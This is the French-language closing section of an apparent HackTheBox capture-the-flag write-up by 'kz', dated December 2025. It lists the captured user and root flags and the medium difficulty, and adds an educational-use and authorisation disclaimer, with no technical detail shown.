Un excellent exercice pour pratiquer l'enchaînement de vulnérabilités et la post-exploitation !

---

**Flags Captured** : ✅ User | ✅ Root

**Author** : kz  
**Date** : Décembre 2025  
**Platform** : HackTheBox  
**Difficulty** : Medium ⭐⭐⭐

---

*Ce writeup est publié à des fins éducatives uniquement. N'utilisez ces techniques que sur des systèmes pour lesquels vous avez une autorisation explicite.*
